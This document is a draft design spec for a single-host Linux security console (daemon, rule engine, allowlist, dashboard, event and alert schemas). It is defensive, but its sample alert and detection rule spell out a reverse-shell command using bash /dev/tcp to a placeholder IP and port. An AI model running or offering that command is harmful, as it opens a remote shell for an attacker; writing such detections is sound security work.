# Local Inspection — Design Specification

| Field | Value |
| --- | --- |
| **Spec version** | `0.2.4` |
| **Date** | 2026-05-24 |
| **Status** | Draft — pending user review |
| **Target OS** | Linux only (developed on CachyOS / Arch family; portable to other modern Linux distros with systemd) |
| **Project working name** | `inspectord` (daemon) + `inspectorctl` (CLI + tray + local web UI) |
| **Source root** | `/home/eli/Development/inspectord` |

## Versioning policy for this spec

* The spec follows semver: **MAJOR** for breaking changes to public interfaces or schemas; **MINOR** for additive features; **PATCH** for clarifications/typos.
* Every schema, config file, IPC surface, and rule format declared in this spec carries an **explicit version field**. Migrations between versions are mandatory and listed in §26.
* Every revision of this document appends an entry to the changelog below.

## Changelog

| Version | Date | Summary |
| --- | --- | --- |
| 0.1.0 | 2026-05-24 | Initial draft. |
| 0.2.0 | 2026-05-24 | Added Dependency Management subsystem (§30): new `dependency_manager` worker, declarative dependency manifest, cross-distro package backends (pacman/apt/dnf/zypper), sidecar-only configuration strategy, backup-before-modify, plan-then-execute UX, post-install verification, runtime health monitoring of dependencies. Updates: §0.1 (purpose), §2.2 (Dependencies panel under Management), §5.2 (worker added), §16.2 (IPC methods), §19.1 (bootstrap step 0), §24 (CLI commands), Appendix B (24 workers). |
| 0.2.1 | 2026-05-24 | dependency_manager subsystem implemented for PacmanBackend + minimal-profile v1 manifests (auditd, journald, aide, yara, libudev, ebpf_features). CLI: `inspectorctl deps {status\|plan\|install\|audit}`. Manual acceptance procedure documented under `docs/manual-acceptance/deps-acceptance.md`. Other distro backends (Apt/Dnf/Zypper) still pending per §31 Phase 4. |
| 0.2.2 | 2026-05-24 | First real collector slice landed: log_tailer (journald + pacman + auth.log parsers), fim_watcher (inotify on /etc, /usr/bin, /usr/sbin, /boot, sudoers, shell rc files, XDG autostart), and the enrichment library (process / file / user enrichers integrated into the supervisor's publish pipeline). New IPC method `list_events`; new CLI `inspectorctl events tail/search`. No rule engine yet. Apt/Dnf/Zypper backends and auditd/nftables/iptables/ufw/kmsg parsers still pending. |
| 0.2.3 | 2026-05-25 | Rule engine + allowlist + notifier landed. Starter rule pack: lolbin.bash_dev_tcp (Python), auth.ssh_brute_force (Python with 60s/5x window correlation), persistence.sudoers_modified (YAML), persistence.new_suid_file (YAML). File-based allowlist at /etc/inspectord/allowlist.yaml with scope evaluation (rule_id / entity / path_glob). DesktopSink via notify-send; Telegram/Signal still pending. IPC: list_alerts/get_alert/ack_alert/resolve_alert/suppress_alert. CLI: inspectorctl alerts {list, show, ack, resolve, suppress}. Sigma rule support still deferred. |
| 0.2.4 | 2026-05-25 | Phase 1 dashboard slice landed: web/Alerts (inbox-zero triage with ack/resolve/suppress), web/Live Events (HTMX-polled feed), web/Health, web/Dependencies. FastAPI app bound to 127.0.0.1:8765, served by inspectorctl-web (also as a user-mode systemd unit template). 24 of 28 spec panels still pending; CSRF/sessions/TLS deferred to a future hardening pass. **Phase 1 of the design is now complete: collector → enrichment → rule engine → allowlist → notifier → CLI → web dashboard all working end-to-end.** |

---

## §0 — Purpose & non-goals

### 0.1 Purpose

A **unified Linux endpoint security console** for a single personal machine. One process tree, one allowlist, one alert stream, one UI — wrapping/aggregating existing best-of-breed tools (Suricata, ClamAV, rkhunter, AIDE, YARA, auditd, eBPF, journald) so the user stops chasing logs across many places and can see, correlate, and act on everything from one dashboard.

The product covers:

1. **Host log aggregation** — journald, auth, audit, firewall, package manager, kernel.
2. **Real-time process & syscall monitoring** via eBPF/auditd.
3. **File integrity monitoring** (real-time + scheduled baseline).
4. **Network IDS** by wrapping Suricata; outbound-connection and listening-socket tracking.
5. **Periodic scanners**: rkhunter, AIDE, ClamAV, YARA — with results normalized.
6. **Behavioral anomaly detection** — statistical (z-score), first-sighting, temporal pattern.
7. **Threat-intel enrichment** — pluggable feeds.
8. **CVE / vulnerability awareness** for installed packages.
9. **Configuration drift detection** for security-sensitive system files.
10. **Hardening posture audit** — Lynis-style recommendations.
11. **Evidence preservation** — automatic snapshotting on high-severity detections.
12. **Unified alert lifecycle** — inbox-zero triage with dedup, grouping into incidents, allowlist scoping, user-confirmed remediation actions.
13. **Local notifications** — desktop popup, Telegram, Signal (all opt-in).
14. **Entity-centric navigation** — click any process / IP / hash / file / user / port to see everything about it.
15. **Automatic dependency management** — detect, install (with user consent), and configure required external tools (Suricata, ClamAV, rkhunter, AIDE, YARA, auditd, etc.) via sidecar configs so the user does not need to install or configure anything manually. Cross-distro support (pacman / apt / dnf / zypper). See §30.

### 0.2 Non-goals (deferred / out of scope for v1)

* Multi-host central server / multi-tenancy.
* Active automatic response (kill / block) without user confirmation.
* Cloud-hosted LLM integration. **No MCP server. No external AI assistance of any kind.** This is intentional: every value an LLM might add is delivered deterministically (triage scoring, statistical anomaly, template-based incident summaries, SQL hunting, rule-template wizard).
* Telemetry, crash reporting, analytics, or any phone-home from `inspectord` itself.
* Browser / browser-extension monitoring.
* Container-aware (Docker/Podman) tracing.
* DNS-over-HTTPS bypass detection.
* Memory forensics / Volatility integration.
* Graph visualization of entity relationships (entity context cards cover ~80% of the value).
* Threat-hunting playbooks (deferred to community content).
* Internationalization (English only).
* Windows / macOS support.

### 0.3 Design principles

1. **Wrap, don't reimplement.** Use existing best-of-breed tools as backends.
2. **Privacy by default.** Every data egress is enumerated, opt-in, and off by default. No telemetry. No phone-home.
3. **Smallest necessary attack surface.** This is a privileged daemon. Every additional interface is a liability.
4. **Deterministic core, no LLM dependency.** Every product capability works without any AI.
5. **Entity-centric, not log-centric.** Investigation flows from "this process / IP / file" → "everything about it," not from raw log queries.
6. **Inbox-zero triage.** The alerts UI is a workflow, not a feed.
7. **Allowlist as a first-class verb.** Every detector supports allowlisting at parser, rule, and entity scopes.
8. **Evidence first, notify second.** High-severity alerts trigger evidence capture before notification.
9. **Profiles for resource awareness.** Two install profiles (`minimal`, `standard`) so users with modest hardware aren't excluded.
10. **Versioned everything.** Schemas, configs, rule formats, IPC — all have explicit versions and migration paths.

---

## §1 — Vision & product principles

### 1.1 The one-sentence pitch

> A single-pane-of-glass security console for your Linux PC: aggregate every detection source, baseline what's normal, surface what's odd, and turn alerts into a triage inbox you can actually drain.

### 1.2 The four product pillars

| Pillar | Concrete deliverable |
| --- | --- |
| **Aggregation** | Every log/scanner/sensor normalized to a common Event schema and a unified dashboard. |
| **Behavioral awareness** | Statistical anomaly detection + first-sighting + temporal patterns, not just signature rules. |
| **Triage-as-workflow** | Alerts are an inbox: dedup, group, ack, resolve, allowlist, with one-click confirmed actions. |
| **Forensic integrity** | High-severity detections automatically preserve evidence before notification; cases bundle related alerts/entities/files for export. |

### 1.3 What makes this *not* just another console

* **Entity context cards**: clicking any subject (process, IP, hash, file, user, port) opens a unified view of everything we know about it across every collector.
* **First-seen badges**: events get 🆕 markers when the entity has never been observed before; trivial but huge for spotting novelty.
* **"Why this alert?" baked into every rule**: each rule carries an explanation read by the UI.
* **Pending actions inbox**: alerts that warrant action surface concrete one-click choices (`kill PID`, `quarantine file`, `block IP`, `add to allowlist scoped to entity X`).
* **Snapshot-on-alert**: implicated files are hashed and copied to a hash-named forensic store *before* the user is notified.

---

## §2 — The Dashboard (the unified console)

The dashboard is the primary deliverable. The daemon, schema, and workers exist to feed it.

### 2.1 UX paradigm

* **Triage as inbox-zero.** The Alerts tab is the default landing surface. Items in state `new` are the inbox. The user works items to one of: `acknowledged`, `resolved`, `suppressed` (allowlisted). Daily zero-out is the implicit goal.
* **Entity-centric pivot.** Any underlined subject anywhere in the UI is a hyperlink that opens that entity's **Context Card** (§14).
* **Keyboard-first.** A documented hotkey map covers navigation, alert state changes, and search. Mouse is fully supported but not required.
* **Severity-aware bundling.** The Overview tab and notifications collapse low-severity floods.

### 2.2 Navigation structure — 5 groups, 28 panels

#### Group 🛡 Posture *(status snapshots — "is everything OK right now?")*

| Panel | Contents |
| --- | --- |
| Overview | Health badge per subsystem; 24h alert count by severity; top noisy rules; top entities in alerts; "system posture score" (weighted: open critical alerts × −10, failed scans × −5, stale baselines × −2, disabled monitors × −10, recent hardening-rec misses × −1). |
| System state | Disk usage by mount; hardware sensors (temperatures, fans, SMART health); LUKS encryption status; NTP sync & clock-drift; swap/memory pressure. |
| Kernel & boot | Kernel version; cmdline; loaded modules (current snapshot + diff vs. baseline); Secure Boot / TPM measured-boot status; recent kernel taints. |
| Sessions & logins | Active sessions (`who`); recent ssh logins (success/failed) with source IP + geo; sshd host-key fingerprint; recent `sudo` invocations. |
| Vulnerabilities | Critical/High CVEs against installed packages from `vuln_scanner` (§15). Click → details + suggested update as pending action. |
| Hardening recs | Lynis-style recommendations from `hardening_auditor` — read-only suggestions. |

#### Group 📡 Activity *(events flowing through)*

| Panel | Contents |
| --- | --- |
| Alerts | The inbox. Filterable by severity / rule / entity / time / status. One-click `ack`, `resolve`, `allowlist` (with scope picker), `open case`. |
| Incidents | Grouped alerts (entity + time-window correlation). Timeline view with rendered narrative summary (template-based, no LLM). |
| Pending actions | Inbox of proposed mitigations awaiting user confirmation. See §9.5 for full action menu. |
| Live events | Real-time tail of normalized events across all collectors with filter + simple search syntax. |
| Hunt | Saved + ad-hoc queries (KQL-ish syntax compiled to SQL against DuckDB) for investigation. |
| Cases | Forensic bundles (§13.4) — created from one or more alerts/entities, with attached evidence and notes; exportable as `.zip`. |

#### Group ⚙ System *(what's running)*

| Panel | Contents |
| --- | --- |
| Processes | Live process tree; per-process: hash, parent chain, cgroup, open files, net activity, first-seen flag, threat-intel match, baseline deviation. |
| Network | Live connections by process; outbound destinations with geo + ASN; WiFi SSID history; Bluetooth pairings; tun/tap/wg interfaces. |
| Firewall | Read-only display of current nftables/iptables/ufw rules; recent deny/allow counters; top blocked sources. |
| Services | All systemd units (running / stopped / failed); diff vs. baseline (new / removed / re-enabled); unusual flag. |
| Users & access | Accounts; sudo membership; password aging; sshd_config snapshot; `~/.ssh/authorized_keys` content with per-key fingerprint and last-seen. |
| Devices | USB / udev history; new block devices; new network interfaces. |
| Persistence | cron jobs; systemd timers; `~/.config/autostart`; `/etc/xdg/autostart`; shell rc files (`.bashrc`, `.zshrc`, `.profile`, `.zprofile`); xdg-autostart; X session scripts. |

#### Group 🔒 Integrity *(did anything change / bad arrive)*

| Panel | Contents |
| --- | --- |
| File integrity | FIM real-time changes; AIDE baseline diff; SUID/SGID inventory + diff; critical-path watch list (e.g., `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d/`, `/boot`, `/usr/bin`, `/usr/sbin`). |
| Antivirus / scanners | rkhunter / ClamAV / YARA / AIDE — last run, status, findings; schedule; on-demand run (proposes pending action). |
| Quarantine | Managed forensic storage for files isolated by scanners or user actions; with hash, original path, capture timestamp, alert reference; restore + delete. |
| Packages | Install / remove / downgrade history (pacman.log); pacman keyring diff; unexpected-downgrade flags. |
| Threat intel | Indicator hits across events; feed status (last-refresh, age); manual indicator entry & local-only indicator lists. |

#### Group 🧰 Management

| Panel | Contents |
| --- | --- |
| Allowlist | All entries grouped by source (rule / scanner / FIM path / etc.); one-click revoke; history; expiry. |
| Rules | Browse all rules (Sigma + YAML + Python); enable / disable; dry-run; per-rule stats (fire count, last fired, false-positive rate); inline edit. |
| Notifications | Sinks (Desktop, Telegram, Signal); per-severity routing matrix; quiet hours; bundling window; verbosity per sink (`minimal` / `summary` / `full`); test sender; send history. |
| Reports | Daily / weekly summaries (HTML + PDF + JSON / CSV); scheduled report generation. |
| Dependencies | All external tools we depend on (auditd, Suricata, ClamAV, rkhunter, AIDE, YARA, GeoIP DB, etc.) with status (installed / missing / outdated / misconfigured), version, source distro package name, last verify-result, and per-tool "Install" / "Configure" / "Verify" / "View backup" / "Remove drop-in" actions. See §30. |
| Audit | Every admin action: alert ack / resolve / allowlist; rule edit; config reload; pending-action approval; dependency install / config / verify. Immutable, hash-chained. |
| Health | Per-worker liveness, event rate, queue depth, dropped events, last error, uptime. Self-baseline of `inspectord`'s own CPU/RAM. Dependency health (each declared dependency must be installed + functional + producing expected output). |
| Settings | Profile (minimal/standard); retention; scheduler; integrations; secrets (libsecret-backed); backup / restore of config + allowlist + custom rules. |

### 2.3 Cross-cutting UI behaviour

* **Severity colour scale**: info (grey), low (blue), medium (yellow), high (orange), critical (red).
* **Time pickers**: every panel with time-range filters supports presets (15 min / 1 h / 6 h / 24 h / 7 d / 30 d / custom).
* **All times displayed in local TZ**, stored as UTC.
* **Density toggle**: comfortable vs. compact row spacing.
* **Dark / light theme**.
* **Diff views** for FIM, baseline, services, packages, drift — syntax-highlighted side-by-side.
* **Context cards** (§14) are modal overlays so navigation isn't lost.

---

## §3 — System architecture overview

### 3.1 Processes & services

```
┌────────────────────────────────────────────────────────────────────────┐
│                        inspectord.service (root, systemd)              │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │                    Supervisor (init + lifecycle)                 │  │
│  │   spawns + monitors workers, owns event router + DuckDB handle   │  │
│  └─────┬──────────┬──────────┬──────────┬──────────┬───────────┬────┘  │
│        │          │          │          │          │           │       │
│   ┌────▼───┐ ┌────▼────┐ ┌───▼───┐ ┌────▼────┐ ┌───▼───┐  ┌────▼────┐  │
│   │collect-│ │collect- │ │ rule  │ │anomaly  │ │evid.  │  │  ipc    │  │
│   │ors x N │ │ors ...  │ │engine │ │detector │ │collect│  │ server  │  │
│   └────┬───┘ └────┬────┘ └───┬───┘ └────┬────┘ └───┬───┘  └────┬────┘  │
│        │          │          │          │          │           │       │
│        └──────────┴──────────┴────► Event Router (in-proc bus) │       │
│                                          │                     │       │
│                       ┌──────────────────┼─────────┐           │       │
│                       ▼                  ▼         ▼           │       │
│                  ┌─────────┐       ┌──────────┐ ┌────────┐     │       │
│                  │ DuckDB  │       │ notifier │ │renderer│     │       │
│                  │ + jrnl  │       │ workers  │ │  (lib) │     │       │
│                  └─────────┘       └────┬─────┘ └────────┘     │       │
│                                         │                       │       │
└─────────────────────────────────────────┼───────────────────────┼──────┘
                                          │                       │
              ┌───────────────────────────┼───────────────────────┘
              │                           │
              ▼                           ▼
        Desktop notifier         Telegram / Signal
        (D-Bus, user-side)         (HTTPS / signal-cli)


┌──────────────────────────────────────────┐    ┌──────────────────────────┐
│ inspectorctl-tray (user, systemd --user) │◄──►│ inspectorctl-web         │
│  • tray icon + popups                    │    │ (127.0.0.1 only,         │
│  • opens local web UI on demand          │    │  user-mode, IPC client)  │
└──────────────────────────────────────────┘    └──────────────────────────┘
              │                                              │
              └────────── Unix socket: /run/inspectord.sock ─┘
                          SO_PEERCRED + polkit for mutations


┌──────────────────────────────────────────┐
│ inspectord-watchdog.service              │
│ tiny separate unit; restarts inspectord; │
│ emits critical event if it can't.        │
└──────────────────────────────────────────┘
```

### 3.2 Process model

* **One privileged daemon** (`inspectord`, root) hosts a supervisor that spawns workers as child processes. Inter-worker communication is JSON-Lines over stdin/stdout to a small in-process **Event Router**.
* **Workers are isolated processes** — a crashed worker doesn't take down the system; the supervisor restarts it with exponential backoff.
* **Per-worker capabilities are dropped after init** to the minimum required (see §17).
* **A separate watchdog** (`inspectord-watchdog.service`) supervises the supervisor — if `inspectord` dies, watchdog restarts it and emits a critical event.
* **Tray & web UI** run as user-mode services (`systemd --user`), connect to the daemon via a Unix socket guarded by `SO_PEERCRED` + polkit.

### 3.3 Data flow

```
raw source ─► collector ─► parser ─► normalized Event ─► enrichment ─► router
                                                                         │
                                                                         ├─► rule engine ─► Alert ─► DuckDB
                                                                         ├─► anomaly detector ─► Alert (anomaly category)
                                                                         ├─► first-sight tracker ─► state update (first_seen table)
                                                                         ├─► evidence collector (on high-severity) ─► forensic store
                                                                         └─► raw event journal (append-only, rolling-hash)

Alert ─► incident grouper ─► Incident (DuckDB)
Alert ─► notifier dispatch (per severity routing)
Alert ─► dashboard live stream (IPC → UI)
```

### 3.4 Why this shape

* **One systemd unit to install**, but many isolated worker processes for crash containment and per-component privilege scoping.
* **One DuckDB instance** owned by the supervisor — analytics-friendly columnar storage that doubles as both write-ahead and query store.
* **No external broker** — keeps the deployment surface small. The in-process router is a few hundred lines of code.
* **Watchdog is a separate unit** so the supervisor itself is supervised.

---

## §4 — Parsers, normalized event schema, and renderers

### 4.1 Three layers

Different sources speak wildly different dialects (`journald` is JSON; `auth.log` is freeform text; `auditd` is `key=value`; Suricata emits EVE JSON; rkhunter prints ASCII; eBPF probes return C structs). Three layers convert this to a single language:

1. **Parsers** — one per source, owned by the relevant collector. Live in `inspectord/parsers/<source>.py`. Independently testable with recorded fixtures (§25).
2. **Normalized event schema** — based on a subset of **Elastic Common Schema (ECS)** so public Sigma rules drop in with minimal mapping.
3. **Renderers** — pure functions converting structured events to short (one-line) and detail (multi-line) human-readable text.

### 4.2 Normalized `Event` schema

| Field path | Type | Description |
| --- | --- | --- |
| `schema_version` | string | `"1.0.0"` — bumps on breaking changes. |
| `@timestamp` | RFC3339 string | UTC. |
| `event.id` | string (UUIDv7) | Globally unique. |
| `event.kind` | enum | `event` / `alert` / `signal` / `state` / `metric`. |
| `event.category` | string[] | e.g. `["process","intrusion_detection"]`. |
| `event.type` | string[] | e.g. `["start","creation","connection","denied"]`. |
| `event.action` | string | short verb, e.g. `process_start`. |
| `event.outcome` | enum | `success` / `failure` / `unknown`. |
| `event.severity` | enum | `info` / `low` / `medium` / `high` / `critical`. |
| `event.module` | string | producing collector, e.g. `process_collector`. |
| `event.first_seen` | bool | `true` if first-sighting tracker has not seen this entity-category before. |
| `host.hostname` | string | |
| `host.os.family` | string | `linux`. |
| `user.{name,id,effective.name,effective.id,groups}` | various | |
| `process.{pid,ppid,name,executable,command_line,hash.sha256,cgroup,parent.*}` | various | |
| `file.{path,hash.sha256,owner,group,mode,mtime,size,setuid,setgid}` | various | |
| `source.{ip,port}` / `destination.{ip,port,geo.country_iso_code,as.number}` | various | |
| `network.{transport,direction,bytes,packets}` | various | |
| `service.{name,unit,state}` | various | |
| `package.{name,version,action}` | various | |
| `device.{name,kind,vendor,product,serial}` | various | |
| `rule.{id,name,ruleset,severity,why}` | various | set on alert events. |
| `threat.indicator.{type,value,source}` | various | set when threat-intel enrichment matches. |
| `baseline.deviation` | number | z-score; set by anomaly detector. |
| `evidence.{case_id,artifact_ref}` | various | set when evidence collector captures artifacts. |
| `raw.{source_file,line,fields}` | object | original line + source-specific fields preserved. |
| `labels` | string[] | free-form. |
| `message` | string | the short renderer output, cached for performance. |

### 4.3 Parsers

| Collector | Parsers shipped |
| --- | --- |
| `log_tailer` | `journald_parser` (structured-JSON passthrough), `auth_log_parser`, `auditd_parser`, `nftables_parser`, `iptables_parser`, `ufw_parser`, `pacman_parser`, `kmsg_parser`. |
| `process_collector` | `ebpf_proc_parser` (decodes raw eBPF probe records). |
| `nids_bridge` | `suricata_eve_parser` (mostly passthrough — Suricata already emits ECS-ish JSON; we re-map fields where needed). |
| `fim_watcher` | `inotify_parser`, `fanotify_parser`. |
| `scanner_runner` | `rkhunter_parser`, `aide_parser`, `clamav_parser`, `yara_parser`. |
| `package_monitor` | shared with `log_tailer.pacman_parser` + dbus events. |
| `udev_monitor` | `udev_parser`. |
| `services_monitor` | `systemd_dbus_parser`. |
| `firewall_inspector` | `nft_state_parser`, `iptables_state_parser`, `ufw_state_parser`. |

Adding a new source = adding a parser + a test fixture, no architectural change.

### 4.4 Renderers

* **Short renderer** — one-line summary used by tray popups, Telegram/Signal, and the alerts list. Jinja2 templates keyed by `event.module` + `event.action`. Rules may override via `message:` template.
* **Detail renderer** — multi-line expansion for the web UI and popup "Details": summary → key/value table of relevant fields → raw line.

Renderers are pure functions of the event — no I/O, no global state.

---

## §5 — Worker catalog

Every worker is an independent supervised process. Each declaration lists: purpose, inputs, outputs, required Linux capabilities, profile inclusion, and failure mode.

### 5.1 Collectors

| Worker | Purpose | Inputs | Outputs | Caps | Profiles | Failure mode |
| --- | --- | --- | --- | --- | --- | --- |
| `log_tailer` | Tail system logs in real time. | journald (sd-journal API), `/var/log/auth.log`, `/var/log/audit/audit.log`, nftables/iptables logs (via journald or files), `/var/log/pacman.log`, `/dev/kmsg`. | normalized Events. | `CAP_DAC_READ_SEARCH`, `CAP_SYSLOG`. | both | Restart with backoff; gaps are flagged as `health_event`. |
| `process_collector` | Real-time process & key syscall monitoring via eBPF (fallback: auditd). | eBPF tracepoints: `sched_process_exec`, `sched_process_exit`, `sys_enter_execve`, `sys_enter_ptrace`, `sys_enter_finit_module`; raw-socket creation. | Events with full `process.*`. | `CAP_BPF`, `CAP_PERFMON`, `CAP_SYS_PTRACE` for proc reads. | standard | Restart; in `minimal` profile, falls back to `auditd` rule pack only. |
| `fim_watcher` | Real-time file integrity for watched paths. | inotify + fanotify. | Events: `file.action=created/modified/deleted/attributes_changed`; `setuid`/`setgid` flagged. | `CAP_DAC_READ_SEARCH`, `CAP_SYS_ADMIN` for fanotify. | both | Restart; gap detection flags missed events. |
| `nids_bridge` | Wrap Suricata; consume EVE-JSON. | Suricata subprocess (managed by us) reading from configured interfaces. | Events from EVE alert / dns / tls / flow / fileinfo records. | `CAP_NET_ADMIN`, `CAP_NET_RAW` (in Suricata). | standard *(opt-in flag inside standard; off by default in `minimal`)* | Restart Suricata; alert if it fails repeatedly. |
| `scanner_runner` | Schedule and run periodic scanners. | rkhunter, AIDE, ClamAV, YARA subprocesses on scheduled cadence + on-demand. | Events with per-scanner findings; `scan_started` / `scan_completed` health events. | per-tool: usually root for rkhunter/AIDE. | both | Per-scan retry; never blocks main loop. |
| `package_monitor` | Watch pacman activity. | dbus events from pacman (where available); tail `/var/log/pacman.log`; pacman keyring diff. | Events with `package.{name,version,action}`. | minimal | both | Restart; safe to miss live signal (log tail is authoritative). |
| `udev_monitor` | USB / udev. | `libudev` netlink. | Events with `device.*`. | `CAP_NET_ADMIN` to bind udev netlink. | both | Restart. |
| `listening_socket_snapshotter` | Diff `ss -tulpn`-equivalent against baseline. | `/proc/net/{tcp,tcp6,udp,udp6}` + sockstat. | Events: new listener / removed listener. | `CAP_NET_ADMIN`. | both | Periodic; missed cycles are harmless. |
| `outbound_connection_tracker` | First-time outbound (proc → IP:port). | conntrack netlink + eBPF probes on `connect()`. | Events with `first_seen=true` when novel. | `CAP_NET_ADMIN`, `CAP_BPF`. | standard | Restart. |
| `kmod_watcher` | Kernel module loads. | audit `MODULE_LOAD` + `/proc/modules` diff. | Events. | minimal. | both | Periodic + audit-driven. |
| `services_monitor` | systemd unit state. | `org.freedesktop.systemd1` D-Bus. | Events: unit added / removed / state-changed / re-enabled. | minimal. | both | Restart; baseline catch-up on startup. |
| `firewall_inspector` | Read current firewall state. | `nft list ruleset`, `iptables-save`, `ufw status`. | `state` events with rule snapshot + counters; diffs flagged. | `CAP_NET_ADMIN`. | both | Periodic; cheap. |

### 5.2 Analysis & support workers

| Worker | Purpose | Inputs | Outputs | Profiles |
| --- | --- | --- | --- | --- |
| `enrichment_worker` | Lazy enrichment between parser and router. | Events. | Same Events with `process.hash`, `file.hash`, `destination.geo`, `destination.as`, `user.groups`, `threat.indicator.*` populated. | both |
| `intel_updater` | Refresh threat-intel feeds on cadence (OFF by default). | configured feed URLs. | Local indicator DB + health events. | both (off by default) |
| `rule_engine` | Evaluate Sigma + YAML + Python rules. | enriched Events. | `Alert` rows in DuckDB; per-rule stats. | both |
| `anomaly_detector` | Statistical + first-sighting + temporal. | enriched Events; baseline tables. | Alerts in `anomaly` category; updates `first_seen` table. | both |
| `evidence_collector` | Snapshot evidence on high-severity alerts. | Alerts of severity ≥ high. | Files in `/var/lib/inspectord/evidence/<sha256>`; `Case` rows in DuckDB. | both |
| `vuln_scanner` | Installed packages × CVE feed. | local package DB + cached CVE feed. | `vulnerabilities` table rows + Alerts when threshold crossed. | both (feed refresh off by default until user enables) |
| `drift_detector` | Periodic snapshot+diff of security-sensitive config. | `sysctl`, kernel cmdline, `sshd_config`, `sudoers`, `pam.d/`, env files. | Events on diff. | both |
| `hardening_auditor` | Periodic Lynis-style audit. | system probes. | `state` rows feeding the Hardening Recs panel. | both |
| `notifier` | Dispatch alerts per severity routing. | Alerts; routing config; verbosity per sink. | Telegram / Signal / D-Bus calls. | both |
| `ipc_server` | Unix-socket JSON-RPC for tray, web UI, CLI. | client requests. | responses; subscriptions for live streams. | both |
| `dependency_manager` | Detect, install (with user consent), configure, verify, and continuously monitor external tool dependencies. Plan-then-execute model with backups and full audit logging. See §30. | dependency manifest; distro detection; current install state; verify probes. | install plans (pending actions); dep-status `state` events; `dep_missing` / `dep_misconfigured` / `dep_outdated` health events. | both |
| `watchdog` | Restart supervisor; emit critical if can't. | systemd liveness + heartbeat from `inspectord`. | systemd journal + emergency event. | both |

**Total workers**: 24.

### 5.3 Worker lifecycle contract

Every worker MUST:

* Accept config via stdin on first start (`{"version": "1.0.0", ...}`) and signal `READY` to the supervisor.
* Emit a heartbeat to the supervisor every 10 s with: events-processed counter, queue depth, last-error.
* Handle `SIGTERM` by flushing in-flight events to stdout and exiting within `KillTimeoutSec`.
* Handle `SIGHUP` by reloading config without dropping in-flight events.
* Drop privileges to the configured minimum capability set immediately after init.

---

## §6 — Event router & event bus

### 6.1 Router model

* Single in-process router owned by the supervisor.
* Workers connect via dedicated stdin/stdout pipes (no shared memory, no sockets between workers).
* Messages are **newline-delimited JSON** (NDJSON), one event per line.
* The router maintains topic-style subscriptions: each subscriber (rule engine, anomaly detector, journal writer, IPC live stream) gets a copy of every event matching its filter.

### 6.2 Queueing & backpressure

* Each subscriber has a **bounded ring buffer** (default 4096 events).
* If the buffer fills, the policy is configurable per subscriber: `block` (apply backpressure) or `drop_oldest_non_critical`. Critical events (`severity=critical`) are never dropped; if a buffer is full of criticals, the writer blocks (this is preferred over losing critical signal).
* Drop counters are surfaced in the Health panel and emit `monitor_health_drop` events.
* **Token-bucket rate-limiting per source** at the parser-output boundary: a misconfigured app spamming syslog cannot exhaust the system. Default: 1000 events/s per source, burst 5000; configurable.

### 6.3 Durability

* All events are written to an **append-only journal** (`/var/lib/inspectord/journal/YYYY-MM-DD.jsonl.gz`) before fan-out, with a rolling SHA-256 hash chain (each line includes the SHA-256 of the previous line's hash + this line). Tampering with the journal is detectable.
* On daemon crash + restart, the supervisor replays the unflushed tail of the journal into the rule engine to ensure no events are silently lost.

### 6.4 Schema version negotiation

* Every event carries `schema_version`. On startup, all workers report the schema version they emit. The supervisor refuses to start if any worker emits a `schema_version` newer than what the rule engine, anomaly detector, or DuckDB schema supports. Migrations are run before workers come up.

---

## §7 — Domain schemas

All schemas declared here carry an explicit `schema_version` and live in `inspectord/schemas/`. They are validated with `jsonschema` on the daemon side and `pydantic` models in code.

### 7.1 `Event` — see §4.2.

### 7.2 `Alert`

```jsonc
{
  "schema_version": "1.0.0",
  "alert_id":       "uuid-v7",
  "rule": {
    "id":            "lolbin.bash_dev_tcp",
    "name":          "Reverse shell via /dev/tcp",
    "ruleset":       "starter-pack",
    "version":       "1.0.0",
    "severity":      "critical",
    "why":           "bash -i >& /dev/tcp/... is a classic reverse-shell pattern. Possible if you ran a CTF tool yourself.",
    "false_positives": ["CTF / pentest tools you ran", "test scripts"]
  },
  "@timestamp":      "2026-05-24T14:23:10.123Z",
  "severity":        "critical",
  "status":          "new",            // new|acknowledged|resolved|suppressed
  "category":        "intrusion_detection",
  "event_ids":       ["…"],
  "entities":        [{"kind":"process","key":"pid:1234@boot-id"},{"kind":"ip","key":"1.2.3.4"}],
  "incident_id":     null,
  "dedup_key":       "lolbin.bash_dev_tcp:pid:1234",
  "dedup_count":     1,
  "first_seen_at":   "…",
  "last_seen_at":    "…",
  "evidence_case_id":"…",
  "notes":           [],
  "labels":          [],
  "rendered": {
     "short":        "🚨 Reverse-shell pattern: bash -i >& /dev/tcp/1.2.3.4/4444 (pid 1234, user eli)",
     "detail":       "…"
  }
}
```

### 7.3 `Incident`

```jsonc
{
  "schema_version": "1.0.0",
  "incident_id": "…",
  "opened_at":   "…",
  "closed_at":   null,
  "status":      "open|closed",
  "primary_entity": {"kind":"process","key":"…"},
  "entity_set":  [{"kind":"…","key":"…"}, …],
  "alert_ids":   [...],
  "severity_max":"critical",
  "narrative":   "Template-rendered, no LLM.",
  "case_id":     null
}
```

### 7.4 `Allowlist entry`

```jsonc
{
  "schema_version": "1.0.0",
  "id":            "…",
  "scope": {
    "rule_id":     "lolbin.bash_dev_tcp",   // optional
    "entity":      {"kind":"file","key":"sha256:…"},   // optional, can use path patterns
    "user_id":     1000,                                // optional
    "path_glob":   "/home/eli/dev/**"                   // optional
  },
  "reason":        "free text",
  "created_by":    "eli@local",
  "created_at":    "…",
  "expires_at":    null,
  "auto_origin":   false,                  // true if proposed by a "tuning suggestion"
  "stats": { "suppressed_count": 12, "last_suppressed_at": "…" }
}
```

Evaluation order: per-event allowlist match → per-rule allowlist match → entity match → path-glob match. First match wins. Allowlist hits are themselves logged as `signal` events for audit visibility.

### 7.5 `Case`

```jsonc
{
  "schema_version": "1.0.0",
  "case_id":      "…",
  "opened_at":    "…",
  "title":        "Suspicious process tree from sshd on 1.2.3.4 login",
  "alert_ids":    [...],
  "incident_ids": [...],
  "entities":     [...],
  "evidence": [
    {"kind":"file","sha256":"…","captured_at":"…","original_path":"/tmp/x"},
    {"kind":"proc_snapshot","ref":"snap:…"},
    {"kind":"net_state","ref":"…"},
    {"kind":"event_bundle","ref":"…"}
  ],
  "notes":        "…",
  "status":       "open|closed",
  "exported_at":  null
}
```

### 7.6 `Baseline` records

| Table | Key | Purpose |
| --- | --- | --- |
| `first_seen` | (category, entity_kind, entity_key) | First-sighting marker; rows added by anomaly detector. |
| `services_baseline` | unit name | Approved services. |
| `listeners_baseline` | (addr, port, process_hash) | Approved listeners. |
| `suid_baseline` | path | Approved SUID set. |
| `packages_baseline` | name | Approved package set. |
| `users_baseline` | username | Approved users. |
